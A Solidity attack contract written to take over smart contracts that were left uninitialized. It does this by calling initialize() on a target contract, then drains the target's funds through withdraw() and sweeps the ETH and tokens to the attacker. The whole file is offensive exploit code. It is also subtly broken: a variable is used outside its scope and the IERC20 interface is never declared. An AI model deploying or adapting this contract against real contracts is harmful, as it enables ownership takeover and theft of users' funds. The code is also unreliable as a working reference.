// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract VulnHunterInitTakeover {
    address public owner;
    address public target;

    constructor(address _target) {
        owner = msg.sender;
        target = _target;
    }

    // Take over by calling uninitialized initialize()
    function exploit() external {
        require(msg.sender == owner);
        // Try common initialize signatures
        (bool s1,) = target.call(abi.encodeWithSignature("initialize(address)", owner));
        if (!s1) {
            (bool s2,) = target.call(abi.encodeWithSignature("initialize()"));
            require(s2, "initialize() failed");
        }
        // Now we own the contract - call privileged functions
        (bool s3,) = target.call(abi.encodeWithSignature("owner()"));
        emit TakeoverAttempted(s1, s2, s3);
    }

    // After takeover: drain funds
    function drain() external {
        require(msg.sender == owner);
        (bool s,) = target.call(abi.encodeWithSignature("withdraw()"));
        emit DrainAttempted(s);
    }

    function sweepETH() external {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }

    function sweepToken(address tokenAddr) external {
        require(msg.sender == owner);
        IERC20(tokenAddr).transfer(owner, IERC20(tokenAddr).balanceOf(address(this)));
    }

    event TakeoverAttempted(bool s1, bool s2, bool s3);
    event DrainAttempted(bool success);
}
